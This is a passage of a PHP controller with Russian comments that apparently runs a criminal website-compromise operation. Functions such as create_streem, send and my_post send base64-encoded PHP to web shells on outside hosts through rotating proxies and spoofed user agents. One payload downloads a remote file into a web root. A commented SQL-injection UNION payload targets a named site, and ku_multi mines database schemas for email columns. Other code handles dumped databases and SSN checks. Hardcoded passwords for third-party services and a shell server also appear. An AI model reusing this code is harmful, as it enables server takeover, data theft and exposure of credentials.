		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.179[128]; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.3.04b)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iOpus-I-M; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; Sgrunt|V109|1746|S-1740532934|dialno; snprtz|dialno; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=; YPC 3.2.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; IEMB3; IEMB3; yplus 5.1.04b)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; FunWebProducts; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; SV1; snprtz|S04087544802137; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; yplus 5.6.02b)");
		
		///рандомные значения
		//$rand_keys = array_rand ($this->proxy);
		//$s = explode(':',$this->proxy[$rand_keys]);
		$ua = trim($uagent[mt_rand(0,sizeof($uagent)-1)]);


		
	    if($this->proxy != ''  AND $this->proxy_enable == true)
		{ 
			$rand_keys = array_rand ($this->proxy);
			
			$s = explode(':',$this->proxy[$rand_keys]);
			
			curl_setopt($ch, CURLOPT_PROXY, trim($s[0]).':'.trim($s[1])); 
				
		}

		 $this->d($url,'$url');
		
		curl_setopt($ch, CURLOPT_URL, $url);           //url страницы
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   //возращаться в файл 
		curl_setopt($ch, CURLOPT_HEADER, $header);           //возвращать заголовки
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);   //переходить по ссылками 
		curl_setopt($ch, CURLOPT_ENCODING, "");        //работать с любыми кодировками 
		curl_setopt($ch, CURLOPT_USERAGENT, $ua);  	 //useragent
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);  //таймаут соединения 
		curl_setopt($ch, CURLOPT_TIMEOUT, $time2);         //тоже самое 
		curl_setopt($ch, CURLOPT_MAXREDIRS, 10);       //количество переходов 
		
        //$result = curl_exec($ch);
		
       // $head = curl_getinfo( $ch );
        //$this->d($result,'$url');
        // $this->d($head,'$head');
        //exit;
        
       // return $result;
        
		return $ch;
		
		
		

	}
	
	function create_streem($serv,$url,$time=100){//отправляет исполняемый код на шелл
		
		$serv = str_replace('http://', '',$serv);
		
		$ch = curl_init();
		
		
		if($this->htaccess_auth !=''){
			//$this->d($this->htaccess_auth);
			curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
			curl_setopt($ch, CURLOPT_USERPWD, $this->htaccess_auth);
		}
		
		
		// AND $this->local_shells == true
	    if($this->proxy != ''  AND $this->proxy_enable == true)
		{ 
			$rand_keys = array_rand ($this->proxy);
			
			$s = explode(':',$this->proxy[$rand_keys]);
			
			curl_setopt($ch, CURLOPT_PROXY, trim($s[0]).':'.trim($s[1])); 
				
		}
		
		
		curl_setopt($ch, CURLOPT_URL, 'http://'.trim($serv));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_MAXCONNECTS, 1000);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($ch, CURLOPT_TIMEOUT, $time);
		curl_setopt($ch, CURLOPT_ENCODING, "UTF-8");
		curl_setopt($ch, CURLOPT_POST, 1);
		
		if($this->domens == true){
		
			$codec = str_replace('URLURL', $url,$this->code);
		}else{
			$url = str_replace('"','',$url);
			$url = str_replace('""','',$url);
			$url = str_replace("'",'',$url);
			$url = str_replace("''",'',$url);
			$codec = str_replace('URLURL', $url,$this->code);
		}
		
		
		
		//$this->d($codec,'$codec');
		//exit;
		
		$postdata = 'fack='.urlencode(base64_encode($codec));			
		
		$headers["Content-Length"] = strlen($postdata);
		$headers["User-Agent"] = "Curl/1.0";
		
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
		

		return $ch;
	}
	
	function send($url = 'http://workdigest.ru/?vac=1&tag=30'){ //отправка через сокет
		
		//print_r($_SERVER);
		
		//[SCRIPT_FILENAME] => D:/EpisodeDT/projects/m0hze/app/webroot/index.php
		$filename = str_replace('webroot/index.php', 'controllers/components/injector.php',$_SERVER['SCRIPT_FILENAME']);
		
		$injectorfile = file_get_contents($filename);
		
		$code = str_replace('URLURL', $url, file_get_contents('code.php'));

		$code = str_replace(array('<?php','?>'), '', $injectorfile.$code);
		
		//	echo $injectorfile;
		//die();
		
		$post = array('fack'=>base64_encode($code));
		

		//$serv  = array('rk.ntlab.su/imgs/news/get.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG','www.trimag.ru/im/get.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG','ru.nordglass.pl/files/get.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG','www.entwine.su/tmp/get.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG','elp.cervantes.ru/inc/get.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG');		 
		
		
		$data = $this->make_http_post_request('rk.ntlab.su', '/imgs/news/get.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG', $post, 'fack');
		
		echo $data;
		
		die();
	}
	
	function make_http_post_request($server, $uri, $post, $uagent) {  //post запрос через сокет
		$_post = Array();  

		if (is_array($post)) {  
			foreach ($post as $name => $value) {  
				$_post[] = $name.'='.urlencode($value);  
			}  
		}  

		$post = implode('&', $_post);  

		$fp = fsockopen($server, 80);  

		if ($fp) {  
			fputs($fp, "POST /$uri HTTP/1.1\r\nHost: $server \r\n".  
			"User-Agent: $uagent \r\nContent-Type:".  
			" application/x-www-form-urlencoded\r\n".  
			"Content-Length: ".strlen($post)."\r\n".  
			"Connection: close\r\n\r\n$post");  
			$content = '';  
			$start = false;
			while (!feof($fp)) {  
				
				$con = fgets($fp);
				
				if($start==true)$content  .= $con;  
				if(trim($con)=='')$start = true;	
				
			}  
			fclose($fp);  

			;  
		}  
		return $content;
	}  
	
	function s_curl ($url, $post = false, $vars = null, $proxy = false){
		$ua = array('', ''); // массив user agent
		
		$ch = curl_init(); 
		curl_setopt ($ch, CURLOPT_URL, $url);
		curl_setopt ($ch, CURLOPT_HEADER, 0);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 10);
		//curl_setopt ($ch,CURLOPT_COOKIEJAR,$this->cookie_file);
		//curl_setopt ($ch,CURLOPT_COOKIEFILE,$this->cookie_file);
		curl_setopt ($ch, CURLOPT_REFERER, 'http://google.com');
		curl_setopt ($ch, CURLOPT_USERAGENT, $ua[array_rand($ua)]); 
		
		
		
		if ($post == true)
		{
			curl_setopt ($ch, CURLOPT_POST, 1); 
			curl_setopt ($ch, CURLOPT_POSTFIELDS, $vars); 
			
			curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt'); 
			curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt'); 
		}
		
		$result = curl_exec($ch);
		return $result;
	}

	function s_curl2 ($url){
		
		$ua = array('', ''); // массив user agent
		
		$ch = curl_init(); 
		curl_setopt ($ch, CURLOPT_URL, $url);
		curl_setopt ($ch, CURLOPT_HEADER, 1);
		curl_setopt ($ch, CURLOPT_MAXCONNECTS, 1000);
		curl_setopt ($ch, CURLOPT_ENCODING, "UTF-8");
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
		curl_setopt ($ch, CURLOPT_NOBODY, 0);
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt ($ch, CURLOPT_TIMEOUT, 10);
		curl_setopt ($ch, CURLOPT_REFERER, 'http://google.com');
		curl_setopt ($ch, CURLOPT_USERAGENT, $ua[array_rand($ua)]); 
		
		
		return $ch; 
	}
	
	function clean_url($value){
		
		
		$value = str_replace('http://http://','http://',$value);
		$value = str_replace('https://http://','http://',$value);
		$value = str_replace('https://','',$value);
		$value = str_replace('http://','',$value);
		$value = str_replace('/','',$value);
		$value = str_replace('WWW.','www.',$value);
		$value = strtolower($value);
		$value =  trim($value);
		
		return $value;
				
		
	}

	
	
	////////ОПРЕДЕЛЯЕМ ПР //////////
	
	function getInfo_pr(){//получение пр
		$this->timeStart = $this->start('getInfo_pr',1);
		
		$data = $this->Post->query("SELECT * FROM  `posts` WHERE `status`=2 AND `pr_check` = 0 ORDER BY id DESC limit 300 ");
		
		//$this->d($data);
		
		
		foreach($data as $d)
		{
			$this->workup();
			$id = $d['posts']['id'];		
			
			$h = parse_url($d['posts']['url']);

			$url=$d['posts']['domen'];
			$ff = new GoogleprComponent();
			
			$pr = $ff->getRank($url);
			if(empty($pr))$pr='0';
			echo $url.'  =   '.$pr.'<br>';
			
			usleep(300000);
			
			
			$this->Post->query('UPDATE `posts` SET `pr`='.$pr.',`pr_check`=1 WHERE id='.$id);
			
			flush();	
		}
		$this->stop();
		
	}
	
	
	/////////ОПРЕДЕЛЯЕМ ALEXA/////////
	
	function getInfo_alexa(){//получение alexa основная
		
		$this->timeStart = $this->start('getInfo_alexa',1);
		$data = $this->Post->query("SELECT * FROM  `posts` WHERE  (`status`=2 or `status`=3) AND `alexa_check` = 0 ORDER BY id DESC limit 100 ");
		
		
	//$this->d($data,'$data');
		
		foreach($data as $d)
		{
			$this->workup();
			$id = $d['posts']['id'];		
			$h = parse_url($d['posts']['url']);
			$url=$d['posts']['domen'];
			
			//$alexa = $this->getAlexaRank($url);
			$alexa = $this->get_rank($url);
			
			if($alexa==0 or $alexa=='0')
			{
				$alexa = 100000000;
			}
			
		
			
			$this->d($alexa,$url);
			
			$this->Post->query('UPDATE `posts` SET `alexa`='.$alexa.',`alexa_check`=1 WHERE id='.$id);
			
			usleep(300000);
			flush();	
		}
		
		$this->stop();
		
	}
	
	function get_rank($domain){//получение алексы, дочерняя НОВАЯ

		$url = "http://data.alexa.com/data?cli=10&dat=snbamz&url=".$domain;

		//Initialize the Curl
		$ch = curl_init(); 

		//Set curl to return the data instead of printing it to the browser.
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,6);

		//Set the URL
		curl_setopt($ch, CURLOPT_URL, $url); 

		//Execute the fetch
		$data = curl_exec($ch); 

		//Close the connection
		curl_close($ch); 

		$xml = new SimpleXMLElement($data); 

		//Get popularity node
		$popularity = $xml->xpath("//POPULARITY");

		//Get the Rank attribute
		$rank = (string)$popularity[0]['TEXT'];
		
		return $rank;
	}
	
	
	/////////ОПРЕДЕЛЯЕМ СТРАНУ/////////
	
	function getInfo_country(){//получение общей инфы о стране и категории
		
		error_reporting(E_ALL);
		$this->timeStart = $this->start('getInfo_country',1);
		
		$data = $this->Post->query("SELECT * FROM  `posts` WHERE `status` =2 AND `country_check` =0 ORDER BY id DESC limit 250 ");
		
		//$this->d($data);
		
		if(require("geoip/geoip.inc")){
			$this->d("geoip/geoip.inc");
		}
		
		foreach($data as $d)
		{
			$this->workup();
			$id = $d['posts']['id'];	
			//$this->d($id);			
			$country = $this->getCountryByIp($id);
			
		
			if(empty($country)){
				$country = 'unkown';
			}
			
			echo $country.'--'.$id.'<br>';
			//$this->d($d);
			

			$this->Post->query('UPDATE `posts` SET `country`="'.$country.'",`country_check`=1 WHERE `id`='.$id);
			
		}
		
		$this->stop();
	}
	
	function getCountryByIp($id){
		
		$squle = $this->Post->query("SELECT * FROM  `posts` WHERE `id` = ".$id." limit 0,1");
		
		$this->d($squle,'$squle');
		
		$h = parse_url($squle[0]['posts']['url']);
		
		$ip = gethostbyname($squle[0]['posts']['domen']);
		
		$this->d($ip,'ip');
		
		
		$gip = geoip_open("geoip/GeoIP.dat", GEOIP_STANDARD);
		$strana =  geoip_country_code_by_addr($gip, $ip);
		geoip_close($gip);
		
		$this->d($strana,'$strana');	
		return $strana;
	}
	
	
	
	////////ОПРЕДЕЛЯЕМ КАТЕГОРИЮ//////////
	
	function getInfo_category(){//получение общей инфы о категории
		$data = $this->Post->query("SELECT * FROM  `posts` WHERE version !='' AND (category ='0' or category='-2:Na vashem schetu nedostatochno sredstv. Popolnite balans.') ORDER BY id DESC limit 25 ");
		
		$login="intertrey";
		$password="okRXcwL3";
		
		Header("Content-Type: text/html; charset=utf8");
		include("IXR_Library.php");			
		
		foreach($data as $d)
		{
			
			$id = $d['posts']['id'];		
			
			$h = parse_url($d['posts']['url']);

			$url=$h['host'];
			
			$this->client = new IXR_Client('http://extheme.ru/xmlrpc.php');
			
			//$this->d($this->client);
			
			if (!$this->client->query('extheme.theme_url', $login, md5($password),$url)) 
			{
				$p = $this->client->getErrorCode().":".$this->client->getErrorMessage();
				$category =  $p;
			}else
			{
				$p = $this->client->getResponse();
				$category =  $p;
			}
			

			$category = $this->translate($category);
			
			echo $category.'--'.$h['hosts'].'<br>';
			
			$category = str_replace('";','',$category);
			$category = str_replace("\r\n",'',$category);
			$category = str_replace("\n",'',$category);
			
			if(trim($category) == '' or !isset($category)) $category = 'unkown';
			
			//$this->Post->query('UPDATE `renders` SET `category`="'.$category.'" WHERE squle="'.$d['renders']['squle'].'" ');
			
			$this->Post->query('UPDATE `posts` SET `category`="'.$category.'" WHERE id='.$id);
			
			flush();	
		}
		
	}
	
	function get_cat($id){//получает category со сторонего сервиса
		
		Header("Content-Type: text/html; charset=utf8"); 
		$url=$h['host'];
		$login="intertrey";
		$password="okRXcwL3";
		
		$this->client = new IXR_Client('http://extheme.ru/xmlrpc.php');
		
		$this->d($client);
		
		if (!$this->client->query('extheme.theme_url', $login, md5($password),$url)) {
			$p = $this->client->getErrorCode().":".$this->client->getErrorMessage();
			unset($this->client);
			return $p;
		}
		$p = $this->client->getResponse();
		unset($this->client);
		return $p;
		
	}
	
	function get_yaca(){//получение категории - основная
		
		$arr = array();
		if(!empty($this->data)){
			for ($i=0;$i<=$this->data['Post']['finish'];$i++){
				$dd =  $this->get_url($i);	

				foreach ($dd as $u){
					$arr[]= $u;	
				}
			}
			foreach ($arr as $value)
			{
				
				//$this->testik($value);
				
			}
			
			//$this->set('url',$arr);
		}
		$this->render('get_url');
	}
	
	function get_url($i){//получение категории из yandex каталога, дочерняя функция
		//http://yaca.yandex.ru/yca/cat/Reference/Encyclopedias/General_encyclopedias/1.html
		$file =  file_get_contents('http://yaca.yandex.ru/yca/cat/Reference/Encyclopedias/General_encyclopedias/'.$i.'.html');
		$arr=array();
		preg_match_all('~<h3 class=\"b-result__head\"><a href=\"(.*?)" class=\"b-result__name~',$file,$arr);
		print_r($arr);
		die();
		return $arr[1];
		
	}

	
	////////ОПРЕДЕЛЯЕМ ТИЦ//////////
	
	function getcy($domain) {//вроде бы получает тиц

		$domain = "http://$domain/";
		
		$xml = file_get_contents("http://bar-navig.yandex.ru/u?ver=2&url=$domain&show=1&post=1");
		
		preg_match('/<tcy rang=\"\d\" value=\"(\d+)\"\/>/Usi', $xml, $res);

		if(empty($res[1])){
			$res[1]=-1;
		}
		
		return $res[1];

	}
	
	
	///////ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ///////
	
	function koneksi($host){//может пригодится для тестирования
		$kon=curl_init($host);
		//curl_setopt($kon, CURLOPT_PROXY, $proxy);
		//curl_setopt($kon, CURLOPT_PROXYPORT, $port);
		curl_setopt($kon, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($kon, CURLOPT_TIMEOUT, 10);
		curl_setopt($kon, CURLOPT_HEADER, 1);
		curl_setopt($kon, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($kon, CURLOPT_REFERER, "http://google.com");
		curl_setopt($kon, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9; Mozilla Firefox');
		$halaman = curl_exec($kon);
		if($halaman)
		{
			return $halaman;
		} else {
			return false;
		}
	}
	
	function randUseragent() {	 
		$ua = 'useragent.txt';
		return trim($ua[mt_rand(0,sizeof($ua)-1)]);
	}
	
	function SelectQueryWhere($from, $where=false, $who='*', $order=false,$limit = false,$prim) {
		$query = "SELECT ".$who." FROM ".$from;
		if($where) {
			$query .= " WHERE ".$where;
		}
		if($order) {
			$query .= " ORDER BY ".$order;
		}
		
		if($limit) {
			$query .= " limit ".$limit;
		}
		if($prim) {
			$query .= " $prim";
		}
		
		
		//print_r($query.'<br>');
		$result = $this->result = mysql_query($query,$this->connection);
		//print_r(2);
		
		if($result) {
			$i = 0;
			while($myrow = mysql_fetch_array($result, MYSQL_ASSOC)) {
				foreach($myrow as $key=>$val) {
					$res[$i][$key] = $val;
				}
				$i++;
			}
		}
		if(count($res) > 0)
		return $res;
		else return false;
	}
	
	function get_arg_url($url){//преобразовывает query в url 
		
		$purl = parse_url($url);

		$url = $purl;
		
		$purl['query'] = str_replace('amp;','', $purl['query']);
		
		if(strstr($purl['query'], '&')){
			
			$purl = explode('&',$purl['query']);
			$new = array();
			foreach ($purl as $value){
				
				$gg = explode('=',$value);
				if(trim($gg[0])!=='')$new [] = $gg[0];
			}
			sort($new);
			$purl = $new;
			
		}else{
			
			$purl = explode('=',$purl['query']);
			$purl = array($purl[0]);
		}
		
		$i=0;
		$str = '';
		foreach ($purl as $value){
			if ($i!==0){
				$str = $str.','.$value;
			}else{
				$str = $value;
			}
			$i++;
		}
		
		$gg = $url['host'];
		
		return $gg.$url['path'].':'.$str;
		
	}
	
	function charcher($code){//примено тоже самое
		
		
		for($i=0;$i<strlen($code);$i++){
			
			
			@$text.=ord($code[$i]);
			
			if($i!==strlen($code)-1){
				
				@$text.=',';
				
			}
			
		}
		return $text;
	}
	
	function char(){//в char переводит $this->data['Post']['tt']
		

		if(!empty($this->data)){
			
			//echo strlen($this->data['Post']['tt']);
			for($i=0;$i<strlen($this->data['Post']['tt']);$i++){
				//echo $i;
				@$text.=ord($this->data['Post']['tt'][$i]);
				if($i!==strlen($this->data['Post']['tt'])-1){
					@$text.=',';
					
				}
			}
			
		}
		
		$this->set('text',$text);
	}
	
	function urls(){//собирает в массив и очищает url и используется в крутатень и единичной разборе где логи
		
		
		$urls = $this->Session->read('urls');
		
		if(count($urls)>0)
		{
			
			$urrrl = '';
			
			foreach ($urls as $value)
			{
				$urrrl .= $this->toyeas($value)."\n\r";
			}

		}else
		{
			$urrrl ='';
		}

		die($urrrl);
	}
	
	function toyeas($cod){ //удаляет не нужные символы из url
		
		$cod = str_replace('%20','+',$cod);
		$cod = str_replace('','',$cod);
		
		return $cod;
	}
	
	function clearUrl(){ //из сессии удаляет url массив
		
		$this->Session->write('urls',array());
		//die();
	}
	
	function renamename($name='sliv/12222.txt'){ // используется при сливе баз
		
		//rename($name, str_replace('.txt','_DONE.txt',$name));
		
	}
	
	function translate($str){ //транслит
		
		
		// Сначала заменяем "односимвольные" фонемы.
		$translit = array(
		"А"=>"A","Б"=>"B","В"=>"V","Г"=>"G",
		"Д"=>"D","Е"=>"E","Ж"=>"J","З"=>"Z","И"=>"I",
		"Й"=>"Y","К"=>"K","Л"=>"L","М"=>"M","Н"=>"N",
		"О"=>"O","П"=>"P","Р"=>"R","С"=>"S","Т"=>"T",
		"У"=>"U","Ф"=>"F","Х"=>"H","Ц"=>"TS","Ч"=>"CH",
		"Ш"=>"SH","Щ"=>"SCH","Ъ"=>"","Ы"=>"YI","Ь"=>"",
		"Э"=>"E","Ю"=>"YU","Я"=>"YA","а"=>"a","б"=>"b",
		"в"=>"v","г"=>"g","д"=>"d","е"=>"e","ж"=>"j",
		"з"=>"z","и"=>"i","й"=>"y","к"=>"k","л"=>"l",
		"м"=>"m","н"=>"n","о"=>"o","п"=>"p","р"=>"r",
		"с"=>"s","т"=>"t","у"=>"u","ф"=>"f","х"=>"h",
		"ц"=>"ts","ч"=>"ch","ш"=>"sh","щ"=>"sch","ъ"=>"y",
		"ы"=>"yi","ь"=>"","э"=>"e","ю"=>"yu","я"=>"ya"
		);
		return strtr($str,$translit);
	}
	

	////////функции Времени//////////
	
	
	function get_time(){//другой замер времени
		list($usec, $sec) = explode(" ",microtime());
		return ((float)$usec + (float)$sec);
	}
	
	function s(){//замер времени
		
		$this->start_time = microtime();

		// разделяем секунды и миллисекунды (становятся значениями начальных ключей массива-списка)

		$start_array = explode(" ",$this->start_time);

		// это и есть стартовое время

		$this->start_time = $start_array[1] + $start_array[0];
		
		
	}
	
	function p($text=''){//конец замера времени
		
		// делаем то же, что и в start.php, только используем другие переменные

		$end_time = microtime();

		$end_array = explode(" ",$end_time);

		$end_time = $end_array[1] + $end_array[0];

		// вычитаем из конечного времени начальное

		$this->stop = $end_time - $this->start_time;
		if($text !=''){
			$this->d($this->stop,$text);
		}else{
			$this->d($this->stop,'!!!STOP_TIME!!!!');
		}
		
	}
	
	
	
	
	function my_post($serv){//отправляет исполняемый код на шелл
		
		
		#$serv = 'http://146.0.72.195/get_post.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG';
		$serv = 'http://149.154.70.238/get_post.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG';
		
		$serv = str_replace('http://', '',$serv);
		
		
		
		
		$ch = curl_init();
		
		
		
		
		curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
		curl_setopt($ch, CURLOPT_USERPWD, "admin:HvLNlS3Sb2Z8cHbV4EyN");
		#curl_setopt($ch, CURLOPT_USERPWD, "admin:dnapdoaknd13113dat123");
		
		
		curl_setopt($ch, CURLOPT_URL, 'http://'.trim($serv));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_MAXCONNECTS, 1000);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($ch, CURLOPT_TIMEOUT, 100);
		curl_setopt($ch, CURLOPT_ENCODING, "UTF-8");
		curl_setopt($ch, CURLOPT_POST, 1);
		
			
		
		$codec = '$ll = $_SERVER["DOCUMENT_ROOT"]."/app/webroot/1.php"; $url = "http://62.109.10.78/w.txt"; $content = file_get_contents($url); file_put_contents($ll, $content);';
		
		
		//$url = "http://62.109.10.78/w.txt"; $content = file_get_contents($url);
		
		//$this->d($content,'$content');
		//exit;
		
		//$$codec = 'php echo 123;';
		
		#$pp = $_SERVER["DOCUMENT_ROOT"].'/app/webroot/my_post.txt';
		
		#$gg =file_get_contents($pp );
		
		$this->d($codec,'$codec');
		#$this->d($pp,'$pp');
		//exit;
		
		//echo eval($codec);
		//exit;
		
		
		$postdata = 'fack='.urlencode(base64_encode($codec));			
		
		$headers["Content-Length"] = strlen($postdata);
		$headers["User-Agent"] = "Curl/1.0";
		
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
		

		
		$content = curl_exec( $ch );
		$err     = curl_errno( $ch );
		$errmsg  = curl_error( $ch );
		$head = curl_getinfo( $ch );
		
		
		$this->d($head,'$head');
		
		$this->d($content,'$content');
		
		$this->d($errmsg,'$errmsg');
		
		$this->d($err,'$err');
		
		return $ch;
	}
	
	function my($id){
		
		if($id ='[ekbnsyjtim'){
			
			
		}
		
		
	}
	
	
	////тестирование ///
	
	function testing($test=''){//
		
		
		$phrase = array('pharma','dating','shop','Tätigkeiten');
		
		$this->timeStart = $this->start('testing');
		
		$urls = $this->Post->query("SELECT * FROM `posts` WHERE `status`=2 AND `prohod`=5 limit 5");

		if(count($urls)==0)
		{
			$this->stop();
			
			echo 'no links testing';
			die();
		}

		
		$tasks = array();
		
		$i=0;

		$cmh = curl_multi_init();
		
		
		$count_urls = count($urls);
		$this->d($count_urls,'$count_urls');
		
		$newservv = $serv;

		for($i=0;$i<$count_urls;$i++)
		{
			
			
			
			$this->workup();
			
			if($i==200 or count($urls) == 0)
			{
				$this->d($i,'count->break'); 
				break;
			}
			
			flush();
			
			$urs_one = array_shift($urls);
			
			
			$urlllll = str_replace('http://', '', trim($urs_one['posts']['url'])); 
			
			$ch = $this->s_curl2('http://'.$urlllll);	
			$tasks[$urs_one['posts']['url']] = $ch;
			curl_multi_add_handle($cmh, $ch);
		}
		
		
		$active = null;

		
		do 
		{
			
			$mrc = curl_multi_exec($cmh, $active);
		}

		while ($mrc == CURLM_CALL_MULTI_PERFORM);


		while ($active && ($mrc == CURLM_OK)) 
		{
			
			if (curl_multi_select($cmh) != -1) 
			{
				
				do 
				{
					
					$this->workup();
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) 
					{
						
						
						$ch = $info['handle'];

						$url = array_search($ch, $tasks);

						$tasks[$url] = curl_multi_getcontent($ch);
						
						
						$content = $tasks[$url];
						
						
						//$this->d($content);
						
						flush();

						$str ='';
						
						foreach($phrase as $kk=>$ph)
						{
							preg_match("/".$ph."/i",$content,$success);
							
							$this->d($success,'$success');
							
							if(count($seccess) > 0)
							{
								$str .= $success[0];
							}
						}
						
						$this->d($success);
						

						//preg_match_all("~<(.*?)>(.*?)<\/(.*?)>~",$content,$arr);
						
						
						
						
						//$this->Post->query("UPDATE  `posts` SET  `prohod` = 5 WHERE  `id` ='".$url['posts']['id']."'");
						


						curl_multi_remove_handle($cmh, $ch);

						curl_close($ch);

						
						
						if(count($urls)>0)
						{			
							$urs_one = array_shift($urls);
							
							if(!empty($urs_shell))
							{
								
								$urlllll = str_replace('http://', '', trim($urs_one['posts']['url'])); 
								$ch = $this->s_curl($urlllll);	
								$tasks[$urs_one['posts']['url']] = $ch;
								curl_multi_add_handle($cmh, $ch);
							}				
						}		
					}
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}
		
		curl_multi_close($cmh);

		

		$this->stop();
		$this->logs("stepTwo ostanovlen  № $r",__FUNCTION__);
		die();

	}

	function orderRestart($id){
		
		if($id==123)
		{
			//$this->Filed->query('UPDATE  `posts` SET  `order` =  "0"');
			
			$this->Filed->query('UPDATE  `posts` SET  `ssn_check` =  0 WHERE `ssn_check` =1');
			
			//$this->Filed->query("DELETE FROM `orders` ");
			
			//$this->Filed->query("DELETE FROM `orders_card` ");
			
			echo 'vse';
		}
	}
		
	function postinfo($id){
		
		
		$poles = $this->Post->query("SELECT * FROM `posts` WHERE `id` =".$id);
		
		$this->d($poles,'postinfo');
		
	}
	
	function nodubles($name){
		
		$file = file($_SERVER['DOCUMENT_ROOT'].'/app/webroot/slivdump_one/'.$name);
		$this->d($_SERVER['DOCUMENT_ROOT'].'/app/webroot/slivdump_one/'.$name);
		$file2 = array_unique($file);
		$name2 = $name.'_nodubles';
		
		 
	$fp = fopen ($_SERVER['DOCUMENT_ROOT'].'/app/webroot/slivdump_one/'.$name2, "w");
	 
	foreach ($file2 as $output)
	{
		fwrite($fp, trim($output)."\r\n");
	}
	 
	fclose($fp);
		
		
		
	}
	
	
	function ku_multi(){
		
		
		
		
		//632817 AND 1=2 uNiON all SEleCT (select CONCAT(0x5b6464645d,unhex(Hex(cast(vErsion() as char))),0x5b6464645d)  limit 0,1),2  //

		////http://www.spoofee.com/index.php?did=632817%20AND%201%3D2%20uNiON%20all%20SEleCT%20%28select%20CONCAT%280x5b6464645d%2Cunhex%28Hex%28cast%28vErsion%28%29%20as%20char%29%29%29%2C0x5b6464645d%29%20%20limit%200%2C1%29%2C2%20%20%23§ion=deal

		
		$squles = $this->Post->query("SELECT * FROM  `posts` WHERE `id`=207");
		

			//$this->d($squles,'$squles');
		
		foreach ($squles as $squle)
		{
		
			$squle['Post'] = $squle['posts'];
			
			if(strlen($squle['Post']['sleep']) > 2)
			{
				$set = $squle['Post']['sleep'];
				$this->d($set,'set');
			}else
			{
				$set = false;
			}
			
		
			
			$this->mysqlInj = new $this->Injector();
			
			$this->proxyCheck();
			
			
			$this->d($squle,'$squle222');
			
			
			$this->mysqlInj ->inject($squle['Post']['header'].'::'.$squle['Post']['gurl'],$squle,$set);
			
			$data = $this->mysqlInj ->mysqlGetVersion();
			
			$this->d($data,'data');
			
			
			exit;
			$data = $this->mysqlInj->mysqlGetAllValue('information_schema','COLUMNS',array('COLUMN_NAME','TABLE_NAME','TABLE_SCHEMA'),0,array(),'WHERE `COLUMN_NAME` LIKE char('.$this->charcher('%mail%').') AND ( `DATA_TYPE`=char('.$this->charcher('char').') OR `DATA_TYPE`=char('.$this->charcher('varchar').') OR `DATA_TYPE`=char('.$this->charcher('text').'))');
			
			$this->d($data,'data');
			
			//exit;
		}
		
	}
	
	function kutest(){
		
